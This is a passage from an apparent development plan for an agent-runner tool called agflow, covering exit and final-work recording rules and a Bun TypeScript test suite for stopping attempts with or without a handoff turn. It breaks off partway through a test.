A final push that moves the WIP ref reports `attempt.wip` before `attempt.exited`, so the hub's assembled handoff note sees the final work. An exit whose work is unchanged since the last push, or since the start when nothing was pushed, reports that work as `finalSha` (the start's sha then), the last push or null as `finalWip`, and no `pushError`: `finalWip` null with `pushError` null means no work was left behind. `lateWorkSha` is set for a failed final push, a `canPushWip` refusal, a known-ended refusal and a final work that threw after its harvest. `follow()` waits for the process exit and then at most 2 s for its events, so a tool that holds the agent's stdout cannot hide an exit. `finishExit` runs once per process, in try/finally, so the store, the registry and the base checkout are always cleaned. `exit.test.ts` drives `pushWithRetries` and `LateWorkRetries` with an injected schedule. macOS must execute every clone-sweep, orphan-cleanup and hand-back security assertion. Missing lsof on macOS fails with a prerequisite diagnostic. Keep portable cases enabled on Linux; macOS-only cases use test.skipIf(process.platform !== 'darwin') with the reason ‘the runner supports darwin-arm64 only; design 7.1’. Never omit individual safety assertions or return early because lsof is missing on macOS.

Add recordFinalWork(state, final): first persist stopped/suspended state, final pushError and any pending final.late.sha as lateWorkSha; only after that write succeeds persist finalizedAt = Date.now(). cleanUpExit uses this ordering for natural exit and every stop/suspend caller. Keep the pending-work write before attempt.exited and the retry behaviour. A failed outcome write cannot produce a completion marker. Completion means the outcome is durable, not that all work reached origin. Shared fixture cleanup already closes controllers before process cleanup and again after settling; retain that cleanup without adding a Task 26 API dependency to Task 25. The macOS cases call `requireLsofOnMacOS` before fixture creation; its error names PATH and `/usr/sbin`.

### Task 27: The attempt controller: stops, handoff turns, holds and runner stops

`stop_attempt` follows design 6.8: with `interruptFirst` or a tool in flight it interrupts and waits for the turn to end; with `handoff` it asks for a handoff note as its own turn and waits up to `handoff` for `write_handoff` or that prompt's acknowledgement; then come the stop ladder, the final work and `attempt.exited`. `hold_attempt` lets the current turn end (at most `hold`), stops without a handoff and keeps the clone and the session. `stopForRunner(cause, { handoff })` serves the runner's own stops (X-7, X-41): `runner_stop` with or without a handoff turn, and `suspend`, which records the attempt as suspended. Stop, hold and take-over count only with the current fence.

```ts
import { afterEach, describe, expect, setDefaultTimeout, test } from 'bun:test';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { FakeAdapter, gitIn, type TranscriptLine } from '@agflow/testkit';
import type { VendorAdapter } from '../src/adapters/types';
import { handoffPrompt } from '../src/attempt/stop';
import { cleanupRunnerFixtures, createRunnerFixture, FIXTURE_PROJECT, type RunnerFixture, waitFor } from './fixture';

afterEach(cleanupRunnerFixtures);

// Every test here runs git or agent processes, which take several times as long on a machine loaded by other suites.
setDefaultTimeout(30_000);

const FENCE = { epoch: 1, counter: 1 };
const LONG_SLEEP = { do: 'sleep', ms: 30_000 } as const;
const WRITE_HANDOFF = { do: 'terminal', tool: 'handoff' } as const;
const STOP = { fence: FENCE, reason: 'a person stopped it', handoff: true, interruptFirst: false, keepClone: false };

const turnsStarted = (f: RunnerFixture, attemptId = 'T-4-a1') =>
  f.events('attempt.activity').filter((event) => event.attemptId === attemptId && event.data.kind === 'turn').length;

/** The transcript of the attempt's session, as the fake agent kept it. */
function transcript(f: RunnerFixture, attemptId = 'T-4-a1'): TranscriptLine[] {
  const spawned = f.events('attempt.spawned').filter((event) => event.attemptId === attemptId);
  const sessionRef = spawned.at(-1)?.data.sessionRef as string;
  const clone = f.paths.clone(FIXTURE_PROJECT, attemptId);
  const file = join(clone, '.agflow', 'run', 'fake-transcripts', `${sessionRef}.jsonl`);
  if (!existsSync(file)) return [];
  return readFileSync(file, 'utf8')
    .split('\n')
    .filter((line) => line !== '')
    .map((line) => JSON.parse(line) as TranscriptLine);
}

const userTexts = (f: RunnerFixture, attemptId?: string) =>
  transcript(f, attemptId)
    .filter((line) => line.role === 'user')
    .map((line) => line.text);

const exitsOf = (f: RunnerFixture, attemptId = 'T-4-a1') =>
  f.events('attempt.exited').filter((event) => event.attemptId === attemptId);

/** Starts T-4-a1 and waits until its first turn has ended. */
async function started(f: RunnerFixture) {
  const controller = f.controller();
  expect(await controller.start(f.spec())).toEqual({ started: true });
  await waitFor(() => f.events('attempt.activity').some((event) => event.data.summary.startsWith('turn completed')));
  return controller;
}

describe('AttemptController: stops', () => {
  test('a stop with handoff asks for a handoff turn and reports handoffWritten; one without asks none', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'text', text: 'working' }], [WRITE_HANDOFF, { do: 'text', text: 'noted' }]] },
    });
    const controller = await started(f);
    const result = await controller.stop(STOP);
    expect(result).toMatchObject({ ok: true, stoppedBy: 'close' });
    const [exited] = exitsOf(f);
    expect(exited?.data).toMatchObject({ stoppedBy: 'close', handoffWritten: true, cause: null });
    expect(result.ok && result.exitedSeq).toBe(exited?.seq as number);
    expect(userTexts(f)).toEqual(['Start working on T-4.', handoffPrompt('a person stopped it')]);
    expect(controller.session).toBeNull();
    expect(f.store.get('T-4-a1')?.state).toBe('stopped');

    const other = f.controller('T-5-a1');
    await other.start(f.spec({ attemptId: 'T-5-a1', taskId: 'T-5', branch: 'agflow/T-5-x', wipRef: 'refs/agflow/T-5/a1' }));
    await waitFor(() => turnsStarted(f, 'T-5-a1') === 1);
    expect(await other.stop({ ...STOP, handoff: false })).toMatchObject({ ok: true });
    expect(exitsOf(f, 'T-5-a1')[0]?.data).toMatchObject({ handoffWritten: false, cause: null });
    expect(userTexts(f, 'T-5-a1')).toEqual(['Start working on T-4.']);
  });

  test('a tool in flight, or interruptFirst, interrupts the turn and waits for its end before the handoff turn', async () => {

      [false, { do: 'tool', command: 'sleep 30' }],
```
